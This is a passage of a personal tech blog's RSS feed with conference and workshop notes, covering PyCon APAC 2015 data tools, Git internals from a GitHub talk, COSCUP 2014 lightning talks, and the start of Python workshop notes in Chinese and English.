&lt;li&gt;Anaconda - easy to install, plus lots of libraries  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building a better PyData Ecosystem  &lt;/li&gt;
&lt;li&gt;Open SOurce Technology  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;Array URLs and compute servers for breaking down data-silos.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bokeh  &lt;ul&gt;
&lt;li&gt;Interactive Visualization in the Browser for Python (and other languages) of large data.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;Optimizaing Compiler for subset of Python which allows multi-core, multi-process and basic CPU support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Pain  &lt;ul&gt;
&lt;li&gt;Dealing with data applications has numerous pain points  &lt;/li&gt;
&lt;li&gt;Hundreds of data formats  &lt;/li&gt;
&lt;li&gt;Basic programs expect all data to fit in memory  &lt;/li&gt;
&lt;li&gt;Data analysis pipelines constantly changin from one form to another  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;NEED, TOOL, CAPABILITY  &lt;/li&gt;
&lt;li&gt;Compisition  &lt;ul&gt;
&lt;li&gt;Distributed Systems  &lt;ul&gt;
&lt;li&gt;spark  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientific Computing  &lt;ul&gt;
&lt;li&gt;HDFS  &lt;/li&gt;
&lt;li&gt;bcolz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BI - DB  &lt;ul&gt;
&lt;li&gt;mongo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DM/Stats/ML  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Abstract experssions, Data Storage, Computational Backend  &lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;Flexible  &lt;/li&gt;
&lt;li&gt;Use compilation of deferred expressions to optimize data interactions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dask  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dask.pydata.org"&gt;http://dask.pydata.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;DAG - TASKS  &lt;ul&gt;
&lt;li&gt;Collections, Task Graph, Schedulers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ODO  &lt;ul&gt;
&lt;li&gt;Shapeshifting for your data  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;odo(source, target)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;JIT, Dynamic compiler for Python  &lt;/li&gt;
&lt;li&gt;Optimize data-parallel computations at call time, to take advantage of local hardware configuration  &lt;/li&gt;
&lt;li&gt;Compatible with C, C++, Fortran  &lt;/li&gt;
&lt;li&gt;C++, C, Fortran, Python =&amp;gt; LLVM IR =&amp;gt; x86, ARM, PTX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Visualization  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bokeh.pydata.org/en/latest/"&gt;Bokeh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bokeh/bokeh"&gt;https://github.com/bokeh/bokeh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Interactive  &lt;/li&gt;
&lt;li&gt;Novel graphics  &lt;/li&gt;
&lt;li&gt;Streaming, dynamic, large data  &lt;/li&gt;
&lt;li&gt;For the browser, with or without a server  &lt;/li&gt;
&lt;li&gt;Matplotlib compatibility  &lt;/li&gt;
&lt;li&gt;No need to write Jade  &lt;/li&gt;
&lt;li&gt;No JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Machine learning in Finance using Python - Eric Tham&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://www.slideshare.net/erictham/machine-learning-in-finance-using-python"&gt;http://www.slideshare.net/erictham/machine-learning-in-finance-using-python&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Pattern recognition, algorithm, data, prediction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is machine Learning  &lt;/li&gt;
&lt;li&gt;Machine in Finance  &lt;ul&gt;
&lt;li&gt;Sentiment Analysis (Behavoiural finance)  &lt;/li&gt;
&lt;li&gt;Credit analytics  &lt;/li&gt;
&lt;li&gt;Financial forecasting  &lt;ul&gt;
&lt;li&gt;Technical transformation on Data  &lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Portfolio allocation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sun, 26 Jul 2015 15:25:54 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-07-26:posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/</guid><category>Conf</category><category>Python</category><category>PyCon</category><category>PyConAPAC</category><category>Thought</category></item><item><title>GitHub Talk - Advanced Git and CI in NCTU</title><link>https://blog.m157q.tw/posts/2015/03/20/github-talk-advanced-git-and-ci-in-nctu/</link><description>&lt;h2&gt;Look into .git directory&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git init foo  
$ &lt;span class="nb"&gt;cd&lt;/span&gt; foo  
$ tree  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.  
├── HEAD  
├── config  
├── description  
├── hooks  
│   ├── applypatch-msg.sample  
│   ├── commit-msg.sample  
│   ├── post-update.sample  
│   ├── pre-applypatch.sample  
│   ├── pre-commit.sample  
│   ├── pre-push.sample  
│   ├── pre-rebase.sample  
│   ├── prepare-commit-msg.sample  
│   └── update.sample  
├── info  
│   └── exclude  
├── objects  
│   ├── info  
│   └── pack  
└── refs  
    ├── heads  
    └── tags  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;refs  &lt;ul&gt;
&lt;li&gt;HEAD, tag, branch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;objects  &lt;ul&gt;
&lt;li&gt;blob, tree, commit  &lt;ul&gt;
&lt;li&gt;blob  &lt;ul&gt;
&lt;li&gt;type, bytes, content of blob  &lt;/li&gt;
&lt;li&gt;ex: &lt;code&gt;blob 13hello,world&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tree  &lt;ul&gt;
&lt;li&gt;main file directory for the project  &lt;/li&gt;
&lt;li&gt;tree: point to the next tree object  &lt;/li&gt;
&lt;li&gt;blob: ref name for blob object (one for every related object files for this tree)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;commit  &lt;ul&gt;
&lt;li&gt;parent: point to the last commit  &lt;/li&gt;
&lt;li&gt;message: commit message  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;store files for git  &lt;/li&gt;
&lt;li&gt;SHA1 hash  &lt;/li&gt;
&lt;li&gt;Compressed  &lt;/li&gt;
&lt;li&gt;commit action will add a commit object and tree object into the objects  &lt;/li&gt;
&lt;li&gt;tree objects have filenames for blob objects  &lt;/li&gt;
&lt;li&gt;blob files which have exactly same content will be stored as the same hash not only in the same project but also among all users.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Branch&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;branch just store the hash of the newest commit for that branch  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tag&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;regular tags do not have hash value  &lt;/li&gt;
&lt;li&gt;be stored in refs/tags  &lt;/li&gt;
&lt;li&gt;just a text file contain the commit object hash  &lt;/li&gt;
&lt;li&gt;annotated tag  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git tag -a $tag_name&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;tagger, annotation  &lt;/li&gt;
&lt;li&gt;has a hash value  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Webhook&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;a href="http://requestb.in/"&gt;http://requestb.in/&lt;/a&gt; as payload url in github, so every time there's a event github will send event message to the payload url.  &lt;/li&gt;
&lt;li&gt;Travis CI  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/muan/emoji"&gt;https://github.com/muan/emoji&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Misc&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;if you delete tree objects manually, &lt;code&gt;git fsck&lt;/code&gt; will tell you what happened.  &lt;/li&gt;
&lt;li&gt;Git does not support empty directory  &lt;/li&gt;
&lt;li&gt;.gitkeep  &lt;/li&gt;
&lt;li&gt;Every files in Git are treated as binary, so the blob file is not just a plaintext file  &lt;/li&gt;
&lt;li&gt;git clone won't clone unreferenced files in default, but you can specify that.  &lt;/li&gt;
&lt;li&gt;git push/pull won't do anything about unreferenced files  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ watch -n .1 tree  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Git commands&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git ls-tree  
git ls-tree HEAD  

git fsck  

git show &lt;span class="nv"&gt;$tag_name&lt;/span&gt; --pretty&lt;span class="o"&gt;=&lt;/span&gt;raw&lt;span class="sb"&gt;`&lt;/span&gt;  

git rebase &lt;span class="nv"&gt;$branch&lt;/span&gt;  

git reflog  
// use reflog to get the &lt;span class="nb"&gt;hash&lt;/span&gt; or &lt;span class="nb"&gt;alias&lt;/span&gt; and use git reset to undo your actions  

git gc  
// delete useless files &lt;span class="o"&gt;(&lt;/span&gt;unreferenced files&lt;span class="o"&gt;)&lt;/span&gt; after &lt;span class="m"&gt;90&lt;/span&gt; days when someone &lt;span class="k"&gt;do&lt;/span&gt; the action  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/muan/emoji/pull/132"&gt;Example at NCTU by johndbritton · Pull Request #132 · muan/emoji · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;雖然內容大部份在 GitBook 都有&lt;br /&gt;
不過真的覺得 &lt;a href="https://github.com/johndbritton"&gt;Mr.Britton&lt;/a&gt; 真的講解得蠻清楚的&lt;br /&gt;
比較理解 .git folder 裡面的東西是在做什麼用的&lt;br /&gt;
CI 的部分只有提到 Travis CI 在 GitHub 上面的 Webhook&lt;br /&gt;
然後 show 一下 GitHub Repo 綁 Traivs CI 後&lt;br /&gt;
在 PR 的時候會幫忙跑測試&lt;br /&gt;
原本以為會介紹一下 Travis CI 大概要怎麼用&lt;br /&gt;
看來得自己找時間研究一下了  &lt;/p&gt;
&lt;p&gt;然後今天又拿到 Octocat 的新貼紙啦&lt;br /&gt;
&lt;img alt="Octocat" src="/files/github-talk-advanced-git-and-ci-in-nctu/octocat.jpg" /&gt;&lt;br /&gt;
感謝 &lt;a href="https://github.com/muan"&gt;muan&lt;/a&gt; 的這則 Twitter &lt;a href="https://twitter.com/muanchiou/status/571684266490265601"&gt;訊息&lt;/a&gt; 才有機會在交大聽到這場 Talk&lt;br /&gt;
原來 &lt;a href="https://github.com/muan/emoji"&gt;https://github.com/muan/emoji&lt;/a&gt; 是她的 Repo&lt;br /&gt;
GitHub 上越來越多 emoji 了XDD  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 27 Oct 2015 12:31:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-03-20:posts/2015/03/20/github-talk-advanced-git-and-ci-in-nctu/</guid><category>Thought</category><category>Git</category><category>GitHub</category><category>Speech</category></item><item><title>COSCUP 2014 Notes and Thoughts</title><link>https://blog.m157q.tw/posts/2014/07/20/coscup-2014-notes-and-thoughts/</link><description>&lt;p&gt;前面是有點長的廢話:  &lt;/p&gt;
&lt;p&gt;今年的日期和 HITCON 對調，改到了七月  &lt;/p&gt;
&lt;p&gt;報到使用了感應式門框 速度超級快  &lt;/p&gt;
&lt;p&gt;上千人報到也都不用等 真的很棒  &lt;/p&gt;
&lt;p&gt;最近的 Conf 都是 IRC(看即時狀況) + Hackpad(筆記)  &lt;/p&gt;
&lt;p&gt;但 Hackpad 對中文輸入的支援實在還是沒有很好  &lt;/p&gt;
&lt;p&gt;所以除了打 code 跟 英文筆記以外 我實在不太想用 hackpad  &lt;/p&gt;
&lt;p&gt;不知道哪時候才有辦法解決這種共筆網站的輸入問題  &lt;/p&gt;
&lt;p&gt;google drive 似乎就沒有這個問題的樣子  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;今年最紅的應該就是桌機哥了吧&lt;br /&gt;
&lt;img alt="桌機哥" src="/files/coscup-2014-notes-and-thoughts/desktop-bro.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;不但被人 &lt;a href="http://www.plurk.com/p/k81ob1"&gt;拍照放到噗浪上&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;還成立了 &lt;a href="https://www.facebook.com/pages/%E6%A1%8C%E6%A9%9F%E5%93%A5/742954022410671"&gt;Facebook 粉絲團&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;不知道會不會掀起自帶主機和螢幕參加 conf 的風潮  &lt;/p&gt;
&lt;p&gt;梗的話就參考 &lt;a href="https://coscup.hackpad.com/COSCUP2014--9DNfsNGRcZX"&gt;hackpad 的梗全集&lt;/a&gt; 吧  &lt;/p&gt;
&lt;p&gt;但應該還是有很多散落在 irc log 和共筆中  &lt;/p&gt;
&lt;p&gt;今年還是一樣沒認識什麼人  &lt;/p&gt;
&lt;p&gt;大概就是個性使然  &lt;/p&gt;
&lt;p&gt;明年想找機會投稿  &lt;/p&gt;
&lt;p&gt;沒機會投稿也要弄個貢獻者專案拿票  &lt;/p&gt;
&lt;p&gt;不想再搶票啦!  &lt;/p&gt;
&lt;p&gt;不過近年來好像真的都是以推廣和發表新作品居多  &lt;/p&gt;
&lt;p&gt;--廠商的贊助廣告也越來越多啦 滿滿整個小袋子--  &lt;/p&gt;
&lt;p&gt;看來要比較多技術性還是得期待 OSDC  &lt;/p&gt;
&lt;p&gt;但是我這種小廢物去 OSDC 的時候又覺得有些聽不太懂  &lt;/p&gt;
&lt;p&gt;所以還是努力加強自己的實力吧...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;嗯 廢話完畢  &lt;/p&gt;
&lt;p&gt;所有相關共筆可以參考 &lt;a href="https://coscup.hackpad.com"&gt;https://coscup.hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;或是直接看 &lt;a href="http://hackfoldr.org/coscup2014"&gt;hack folder 整合&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;有現場聽的議程我幾乎都有在 hackpad 做共筆  &lt;/p&gt;
&lt;p&gt;(雖然常常當掉要一直狂 refresh 但還是覺得就是應該用共同筆記 而不是自己弄自己的 這樣才有 Open Source 的感覺啊)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;數位時代  &lt;ul&gt;
&lt;li&gt;感應門報到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hlb  &lt;ul&gt;
&lt;li&gt;KKTIX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenATC  &lt;ul&gt;
&lt;li&gt;http://www.openatc.club/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;penk  &lt;ul&gt;
&lt;li&gt;https://github.com/penk/terrarium-app  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;COSCUP 的便當  &lt;ul&gt;
&lt;li&gt;http://shiapic.loliconis.me/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;KDockerWeb - Docker Web 管理界面  &lt;ul&gt;
&lt;li&gt;https://github.com/tsaikd/kdocker-web  &lt;/li&gt;
&lt;li&gt;http://tsaikd.org/kdocker-web/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;硬是要 69 - YuTin  &lt;ul&gt;
&lt;li&gt;66K - xdite  &lt;/li&gt;
&lt;li&gt;67K - tirky  &lt;/li&gt;
&lt;li&gt;69K 因為我愛 69 !  &lt;ul&gt;
&lt;li&gt;Google Forms  &lt;/li&gt;
&lt;li&gt;Google Public API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攝護線  &lt;ul&gt;
&lt;li&gt;大腸花、白色正義協助直播  &lt;/li&gt;
&lt;li&gt;要突破警察的黑畫面  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.inlive.tw"&gt;http://www.inlive.tw&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open Source Job Board - Sammy Fung  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sammyfung/drupal7-job"&gt;https://github.com/sammyfung/drupal7-job&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己的遊戲產業自己救 - Johnson Lin  &lt;ul&gt;
&lt;li&gt;我的 Open Office crash 啦  &lt;ul&gt;
&lt;li&gt;imacat 上去救援  &lt;/li&gt;
&lt;li&gt;又 crash 啦  &lt;/li&gt;
&lt;li&gt;NOTO SANS 字體會讓 Open Office 當掉  &lt;/li&gt;
&lt;li&gt;https://github.com/adobe-fonts/source-han-sans/issues/27  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;https://igdshare.org/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Firfox Appmaker - orinx  &lt;ul&gt;
&lt;li&gt;Webmaker &lt;a href="https://webmaker.org/"&gt;https://webmaker.org/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Appmaker &lt;a href="https://apps.webmaker.org/designer"&gt;https://apps.webmaker.org/designer&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;疑似 NG0 案例分享 - 雨蒼  &lt;ul&gt;
&lt;li&gt;公民 1985 行動聯盟 - 國會調查兵團  &lt;ul&gt;
&lt;li&gt;PTT 上號昭  &lt;/li&gt;
&lt;li&gt;Skype 開會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;影片真的超有梗  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iHaskell - carlsu  &lt;ul&gt;
&lt;li&gt;https://github.com/gibiansky/IHaskell  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們能有文化的編程 - 大媽  &lt;ul&gt;
&lt;li&gt;我沒有幻燈，你拔不到我的線  &lt;/li&gt;
&lt;li&gt;我們都是碼農，我們都是程序猿  &lt;/li&gt;
&lt;li&gt;已經開始自稱碼畜了  &lt;/li&gt;
&lt;li&gt;如何提高我們程序猿的逼格？  &lt;/li&gt;
&lt;li&gt;Knuth  &lt;ul&gt;
&lt;li&gt;The Art Of Programming  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Literate_programming"&gt;Literate Programming&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Python Leo  &lt;/li&gt;
&lt;li&gt;在這個編程環境中，我感覺我真的有文化了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[加碼] 桌機哥  &lt;ul&gt;
&lt;li&gt;明年有考慮辦桌機 Bof 嗎?  &lt;/li&gt;
&lt;li&gt;有人跟我一樣帶桌機的話可以考慮  &lt;/li&gt;
&lt;li&gt;什麼因緣下讓你帶桌機來?  &lt;/li&gt;
&lt;li&gt;就...剛好沒有筆電可以用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 28 Oct 2015 12:55:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2014-07-20:posts/2014/07/20/coscup-2014-notes-and-thoughts/</guid><category>Conf</category><category>Taiwan</category><category>COSCUP</category><category>Open Source</category><category>Note</category><category>Thought</category></item><item><title>開放源碼的動態程式設計語言體驗營 - Python</title><link>https://blog.m157q.tw/posts/2013/04/09/tutorial-for-open-source-dynamic-typing-language-python/</link><description>&lt;h3&gt;Event&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.openfoundry.org/en/activities/details/366"&gt;Activities - 開放源碼的動態程式設計語言體驗營 - Python - OpenFoundry&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Slides&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.openfoundry.org/tw/slides-download/cat_view/35/711/712"&gt;Downloads | 03/09 開放源碼的動態程式設計語言體驗營 - Python | 2013年-活動/研討會 | 歷年活動／研討會簡報 | 活動 / 研討會相關 - OpenFoundry&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;備份  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/raw/source/content/files/tutorial-for-open-source-dynamic-typing-language-python/0309_programming-with-python-basic.pdf"&gt;Day 1&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/raw/source/content/files/tutorial-for-open-source-dynamic-typing-language-python/0310_programming-with-python-adv.pdf"&gt;Day 2&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Videos&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=cUYu6v6b_oY&amp;amp;list=PLuW7NCGvKlyXZxvnpZxwu6AUeSdqkcmbm"&gt;自由軟體鑄造場_20130309_開放源碼的動態程式設計語言體驗營 - Python_Mosky_01 - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=AXpV-sUIYqI&amp;amp;list=PLuW7NCGvKlyU82s5TX8LqGk9arydf9m9Z"&gt;自由軟體鑄造場_20130310_開放源碼的動態程式設計語言體驗營 - Python_Mosky_01 - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上個月去台北大同大學跟 Mosky 學 Python 做的一些筆記&lt;br /&gt;
同樣的筆記我也有放在 gist 上，但是純文字版。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/5124618"&gt;20130309-mosky-python-day1 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/5128627"&gt;20130309-mosky-python-day2 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Mosky 真的超萌而且聲音超好聽的 &amp;gt;////&amp;lt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;後記 (2015/10/26)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;寫這篇筆記的當時還不太熟 Markdown&lt;br /&gt;
所以 gist 是略帶 Markdown 語法的純文字版&lt;br /&gt;
當時因為懶惰，所以把純文字直接複製貼上到 blog 就沒管了&lt;br /&gt;
最近在整理舊的 blog 文章，整理到這篇。&lt;br /&gt;
因為純文字版本在 Pelican 上 rendering 的效果很恐怖&lt;br /&gt;
所以這邊的版本是從純文字修改為 Markdown 的版本&lt;br /&gt;
同時也修正了一些當年筆記上的錯誤和補充一些內容&lt;br /&gt;
轉眼間接觸 Python 已經兩年半了呢&lt;br /&gt;
這些當年看起來內容很生澀的筆記，現在也都懂了&lt;br /&gt;
這種感覺有點神奇&lt;br /&gt;
目前愈來愈喜歡 Python 這個語言了&lt;br /&gt;
至於內文把 Python 的 P 全用成小寫 p，我實在懶的改，意思有到就好了嘛(?)&lt;br /&gt;
或許哪天我的強迫症發作了，我又會回來改這篇文章也說不定。&lt;br /&gt;
筆記看似很多，其實仍然因為打字速度不夠快的原因，沒紀錄到很完整，但大概有八成了吧  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="https://pypi.python.org/pypi"&gt;PyPI&lt;/a&gt; - commit your python project&lt;/h3&gt;
&lt;h3&gt;project -  a blog system&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Dynamic typing, Static typing, Functor, Closure  我還不熟的東西  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 - 2013.03.09&lt;/h1&gt;
&lt;h2&gt;Python 2 or 3 ?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2.7 是 2.x 最後一個 release  &lt;/li&gt;
&lt;li&gt;python 目前全力投入 3.x 的開發  &lt;/li&gt;
&lt;li&gt;3.x is easier for newcomer  &lt;/li&gt;
&lt;li&gt;2.x has more third-party lib  &lt;/li&gt;
&lt;li&gt;轉換 Syntax  &lt;ul&gt;
&lt;li&gt;2to3.py (官方)  &lt;/li&gt;
&lt;li&gt;3to2.py(非官方)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2.x 有 backported features 因為和 3.x 平行開發，所以會把 3.x 的一些 features 拿回來用  &lt;/li&gt;
&lt;li&gt;Use Python 3 if you can.    用 python3 就對了(?  &lt;/li&gt;
&lt;li&gt;根據你要用的 library 選擇 2.x 或 3.x  &lt;/li&gt;
&lt;li&gt;課程會以 python2.7 為主, 但會介紹 3.x 中的改變  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般看到的都是 cpython , 對 c/c++ 提供較好的相容性,&lt;br /&gt;
可以在 c/c++ 中寫 python 的 module, 然後在 python 中 import 進來&lt;br /&gt;
主流都是用 cpython, 一般的 document 也都是以 cpython 為主  &lt;/p&gt;
&lt;h2&gt;byte code&lt;/h2&gt;
&lt;h2&gt;Python Shell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt;: 直接執行一行式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &amp;#39;print &amp;quot;hello, world&amp;quot;&amp;#39;    # python2  
python -c &amp;#39;print(&amp;quot;hello, world&amp;quot;)&amp;#39;   # python3  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-m&lt;/code&gt;: 使用module  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -m SimpleHTTPServer [port]   # python2  
python -m http.server [port]        # python3  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;hello.py&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用 4 個空白 不要用 tab  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:&lt;/code&gt; 是一個 block 開始的意思  &lt;/li&gt;
&lt;li&gt;換行就代表一個 statement 的結束  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;  &lt;span class="c1"&gt;# the name of module  &lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 類似 C 裏面的 main 函數  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Common types&lt;/h2&gt;
&lt;ul&gt;
